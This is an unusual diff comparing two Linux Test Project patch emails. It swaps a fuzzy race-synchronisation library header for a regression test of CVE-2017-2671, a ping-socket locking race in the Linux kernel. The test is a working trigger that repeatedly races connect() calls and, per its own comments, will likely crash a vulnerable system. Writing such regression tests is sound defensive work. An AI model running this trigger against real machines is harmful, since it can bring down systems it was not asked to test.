@@ -1,38 +1,69 @@
 From: Richard Palethorpe <rpalethorpe@suse.com>
-Date: Thu, 27 Apr 2017 15:27:41 +0200
-Subject: [LTP] [RFC 1/2] Add fuzzy synchronisation library for triggering
-	races
-Message-ID: <20170427152741.2f8a4061@linux-v3j5>
+Date: Thu, 27 Apr 2017 15:27:45 +0200
+Subject: [LTP] [RFC 2/2] Add test for CVE-2017-2671
+Message-ID: <20170427152745.43640e51@linux-v3j5>
 List-Id: <ltp.lists.linux.it>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 To: ltp@lists.linux.it
 
-Provide some functions for starting two actions at approximately the same time
-on different threads or processes. This is intended to amalgamate
-functionality built into at least three CVE tests. As well as conforming to
-DRY it is intended to help make reasoning about each test easier by
-abstracting away the synchronisation mechanism.
-
-Signed-off-by: Richard Palethorpe <rpalethorpe@suse.com>
 ---
 
-I still need to convert at least a couple of other CVE tests to use this
-library, but they use practically the same code so it should not be difficult.
+This needs the CVE patch set, which I will incorporate this into. However I am
+posting it now just in case someone is interested.
 
- include/tst_fuzzy_sync.h | 189 +++++++++++++++++++++++++++++++++++++++++++++++
- 1 file changed, 189 insertions(+)
- create mode 100644 include/tst_fuzzy_sync.h
+ runtest/cve                   |   1 +
+ testcases/cve/.gitignore      |   1 +
+ testcases/cve/Makefile        |   1 +
+ testcases/cve/cve-2017-2671.c | 127 ++++++++++++++++++++++++++++++++++++++++++
+ 4 files changed, 130 insertions(+)
+ create mode 100644 testcases/cve/cve-2017-2671.c
 
-diff --git a/include/tst_fuzzy_sync.h b/include/tst_fuzzy_sync.h
+diff --git a/runtest/cve b/runtest/cve
+index 359958ca9..5958d6c39 100644
+--- a/runtest/cve
++++ b/runtest/cve
+@@ -4,6 +4,7 @@ cve-2014-0196 cve-2014-0196
+ cve-2016-4997 cve-2016-4997
+ cve-2016-5195 dirtyc0w
+ cve-2016-7117 cve-2016-7117
++cve-2017-2671 cve-2017-2671
+ cve-2017-5669 cve-2017-5669
+ cve-2017-6951 cve-2017-6951
+ cve-2017-7277 cve-2017-7277
+diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
+index 516ea62a5..376964266 100644
+--- a/testcases/cve/.gitignore
++++ b/testcases/cve/.gitignore
+@@ -2,6 +2,7 @@ cve-2012-0957
+ cve-2014-0196
+ cve-2016-4997
+ cve-2016-7117
++cve-2017-2671
+ cve-2017-5669
+ cve-2017-6951
+ cve-2017-7277
+diff --git a/testcases/cve/Makefile b/testcases/cve/Makefile
+index d642b73b4..ff8fcf1d6 100644
+--- a/testcases/cve/Makefile
++++ b/testcases/cve/Makefile
+@@ -21,5 +21,6 @@ CFLAGS			+= -D_GNU_SOURCE
+ 
+ cve-2014-0196:	LDFLAGS += -lpthread -lutil -lrt
+ cve-2016-7117:	LDFLAGS += -lpthread -lrt
++cve-2017-2671:	LDFLAGS += -lpthread
+ 
+ include $(top_srcdir)/include/mk/generic_leaf_target.mk
+diff --git a/testcases/cve/cve-2017-2671.c b/testcases/cve/cve-2017-2671.c
 new file mode 100644
-index 000000000..ab8092d72
+index 000000000..bee48bb4a
 --- /dev/null
-+++ b/include/tst_fuzzy_sync.h
-@@ -0,0 +1,189 @@
++++ b/testcases/cve/cve-2017-2671.c
+@@ -0,0 +1,127 @@
 +/*
 + * Copyright (c) 2017 Richard Palethorpe <rpalethorpe@suse.com>
++ * Original POC by Daniel Jiang
 + *
 + * This program is free software: you can redistribute it and/or modify
 + * it under the terms of the GNU General Public License as published by
@@ -48,177 +79,114 @@ index 000000000..ab8092d72
 + * along with this program. If not, see <http://www.gnu.org/licenses/>.
 + */
 +/*
-+ * Fuzzy Synchronisation - abreviated to fzsync
++ * Test for CVE-2017-2671 faulty locking on ping socket
 + *
-+ * This library is intended to help reproduce race conditions while running in
-+ * a loop. You can use it to measure the time at which two functions are
-+ * called in different threads. Then calculate the average time gap between
-+ * the function calls and introduce a delay in one thread to synchronise the
-+ * calls.
++ * When sys_connect() is called with sockaddr.sin_family set to AF_UNSPEC on a
++ * ping socket; __udp_disconnect() gets called, which in turn calls the buggy
++ * function ping_unhashed(). This function does not obtain a rwlock before
++ * checking if the socket is hashed allowing the socket data to be pulled from
++ * underneath it in the time between calling sk_hashed() and gaining the write
++ * lock.
 + *
-+ * It is called 'fuzzy' synchronisation because the time gap will naturally vary
-+ * due to environmental factors. It is not a 'hard' synchronisation mechanism
-+ * like lockstepping.
++ * Fixed in commit 43a6684519ab0a6c52024b5e25322476cabad893
 + *
-+ * For a usage example see testcases/cve/cve-2017-2671.c
++ * This test repeatedly 'connects' a ping socket correctly then calls
++ * connect() with AF_UNSPEC in two seperate threads to trigger the race
++ * condition. If the bug is present, then the test will most likely crash the
++ * system.
++ *
++ * The test requests root privileges so that it can ensure pings sockets are
++ * enabled. On distributions (including Android) where ping sockets are
++ * enabled by default, root privileges are not required.
 + */
 +
-+#include <sys/time.h>
-+#include <time.h>
++#include <stdio.h>
++#include <sys/socket.h>
++#include <arpa/inet.h>
++#include <stdlib.h>
++
++#include "tst_test.h"
++#include "tst_safe_net.h"
++#include "tst_safe_pthread.h"
++
++#include "tst_fuzzy_sync.h"
 +
 +#ifndef CLOCK_MONOTONIC_RAW
 +#define CLOCK_MONOTONIC_RAW CLOCK_MONOTONIC
 +#endif
 +
-+/**
-+ * struct tst_fzsync_pair - the state of a two way synchronisation
-+ * @avg_diff: The average time difference over multiple iterations
-+ * @avg_diff_trgt: The desired average time difference, defaults to 0
-+ * @avg_alpha: The rate at which old diff samples are forgotten,
-+ *             defaults to 0.25
-+ * @a: The time at which call site A was last passed
-+ * @b: The time at which call site B was last passed
-+ * @delay: The size of the delay, positive to delay A, negative to delay B
-+ * @delay_inc: The step size of a delay increment, defaults to 10
-+ * @update_gap: The number of iterations between recalculating the delay.
-+ *              Defaults to 0xF and must be of the form $2^n - 1$
-+ *
-+ * This contains all the necessary state for synchronising two points A and
-+ * B. Where A is the time of an event in one process and B is the time of an
-+ * event in another process.
-+ */
-+struct tst_fzsync_pair {
-+	double avg_diff;
-+	double avg_diff_trgt;
-+	double avg_alpha;
-+	struct timespec a;
-+	struct timespec b;
-+	long delay;
-+	long delay_inc;
-+	int update_gap;
++#define ATTEMPTS 0xFFFF
++#define PING_SYSCTL_PATH "/proc/sys/net/ipv4/ping_group_range"
++
++static int sockfd;
++static unsigned int ping_min_grp = 1, ping_max_grp;
++static struct tst_fzsync_pair fzsync_pair = {
++	.delay_inc = 1,
 +};
++static struct sockaddr_in iaddr, uaddr;
 +
-+/**
-+ * tst_fzsync_pair_init - Set default values if they are zero
-+ * @pair: Zeroed fuzzy pair state struct
-+ */
-+static void tst_fzsync_pair_init(struct tst_fzsync_pair *pair)
++static void setup(void)
 +{
-+	if (pair->avg_alpha == 0)
-+		pair->avg_alpha = 0.25;
-+	if (pair->delay_inc == 0)
-+		pair->delay_inc = 10;
-+	if (pair->update_gap == 0)
-+		pair->update_gap = 0xF;
++	iaddr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
++	uaddr = iaddr;
++	iaddr.sin_family = AF_INET;
++	uaddr.sin_family = AF_UNSPEC;
++	tst_fzsync_pair_init(&fzsync_pair);
++
++	SAFE_FILE_SCANF(PING_SYSCTL_PATH, "%u %u",
++			&ping_min_grp, &ping_max_grp);
++	SAFE_FILE_PRINTF(PING_SYSCTL_PATH, "0 0");
 +}
 +
-+static void tst_fzsync_pair_info(struct tst_fzsync_pair *pair)
++static void cleanup(void)
 +{
-+	tst_res(TINFO, "avg_diff = %.5gns, delay = %05ld loops",
-+		pair->avg_diff, pair->delay);
++	if (ping_min_grp | ping_max_grp)
++		SAFE_FILE_PRINTF(PING_SYSCTL_PATH, "%u %u",
++				 ping_min_grp, ping_max_grp);
 +}
 +
-+/**
-+ * tst_fzsync_delay_a - Perform spin delay for A, if needed
-+ *
-+ * Usually called just before the point you want to synchronise.
-+ */
-+static inline void tst_fzsync_delay_a(struct tst_fzsync_pair *pair)
++static void *connect_b(void * param LTP_ATTRIBUTE_UNUSED)
 +{
-+	volatile long spin_delay = pair->delay;
++	tst_fzsync_delay_b(&fzsync_pair);
++	connect(sockfd, (struct sockaddr *)&uaddr, sizeof(uaddr));
++	tst_fzsync_time_b(&fzsync_pair);
 +
-+	while (spin_delay > 0)
-+		spin_delay--;
++	return 0;
 +}
 +
-+/**
-+ * tst_fzsync_delay_b - Perform spin delay for B, if needed
-+ *
-+ * Usually called just before the point you want to synchronise.
-+ */
-+static inline void tst_fzsync_delay_b(struct tst_fzsync_pair *pair)
++static void run(void)
 +{
-+	volatile long spin_delay = pair->delay;
++	pthread_t thrd;
++	int i;
 +
-+	while (spin_delay < 0)
-+		spin_delay++;
-+}
++	sockfd = SAFE_SOCKET(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
++	tst_res(TINFO, "Created ping socket, attempting to race...");
 +
-+static inline void tst_fzsync_time(struct timespec *t)
-+{
-+	clock_gettime(CLOCK_MONOTONIC_RAW, t);
-+}
++	for (i = 0; i < ATTEMPTS; i++) {
++		SAFE_CONNECT(sockfd,
++			     (struct sockaddr *)&iaddr, sizeof(iaddr));
++		SAFE_PTHREAD_CREATE(&thrd, 0, connect_b, 0);
 +
-+/**
-+ * tst_fzsync_time_a - Set A's time to now.
-+ *
-+ * Called@the point you want to synchronise.
-+ */
-+static inline void tst_fzsync_time_a(struct tst_fzsync_pair *pair)
-+{
-+	tst_fzsync_time(&pair->a);
-+}
++		tst_fzsync_delay_a(&fzsync_pair);
++		connect(sockfd, (struct sockaddr *)&uaddr, sizeof(uaddr));
++		tst_fzsync_time_a(&fzsync_pair);
 +
-+/**
-+ * tst_fzsync_time_b - Set B's call time to now.
-+ *
-+ * Called at the point you want to synchronise.
-+ */
-+static inline void tst_fzsync_time_b(struct tst_fzsync_pair *pair)
-+{
-+	tst_fzsync_time(&pair->b);
-+}
++		SAFE_PTHREAD_JOIN(thrd, 0);
++		tst_fzsync_pair_update(i, &fzsync_pair);
 +
-+/**
-+ * tst_exp_moving_avg - Exponential moving average
-+ * @alpha: The preference for receant samples over old ones.
-+ * @sample: The current sample
-+ * @prev_avg: The average of the all the previous samples
-+ *
-+ * Returns average including the current sample.
-+ */
-+static inline double tst_exp_moving_avg(double alpha, long sample,
-+					double prev_avg)
-+{
-+	return alpha * sample + (1.0 - alpha) * prev_avg;
-+}
-+
-+/**
-+ * tst_fzsync_pair_update - Recalculate the delay
-+ * @loop_index: The i in "for(i = 0;..." or zero to ignore update_gap
-+ * @pair: The state necessary for calculating the delay
-+ *
-+ * This should be called at the end of each loop to update the average
-+ * measured time difference (between A and B) and update the delay. It is
-+ * assumed that A and B are less than a second apart.
-+ *
-+ * The values of update_gap, avg_alpha and delay_inc decide the speed at which
-+ * the algorithm approaches the optimum delay value and whether it is
-+ * stable. If your test is behaving strangely, it could be because this
-+ * algorithm is behaving chaotically and flip-flopping between large positve
-+ * and negative delay values. You can call tst_fzysync_pair_info every few
-+ * loops to check whether the average difference and delay values are stable.
-+ */
-+static void tst_fzsync_pair_update(int loop_index, struct tst_fzsync_pair *pair)
-+{
-+	long diff;
-+	long inc = pair->delay_inc;
-+	long delay = pair->delay;
-+	double target = pair->avg_diff_trgt;
-+	double avg = pair->avg_diff;
-+
-+	diff = pair->a.tv_nsec - pair->b.tv_nsec;
-+	avg = tst_exp_moving_avg(pair->avg_alpha, diff, avg);
-+
-+	if (!(loop_index & pair->update_gap)) {
-+		if (avg > target)
-+			delay -= inc;
-+		else if (avg < target)
-+			delay += inc;
++		if (!(i & 0x7FFF))
++			tst_fzsync_pair_info(&fzsync_pair);
 +	}
 +
-+	pair->avg_diff = avg;
-+	pair->delay = delay;
++	tst_res(TPASS, "We didn't crash");
 +}
++
++static struct tst_test test = {
++	.tid = "cve-2017-2671",
++	.setup = setup,
++	.test_all = run,
++	.cleanup = cleanup,
++	.needs_root = 1,
++};
 -- 
 2.12.2
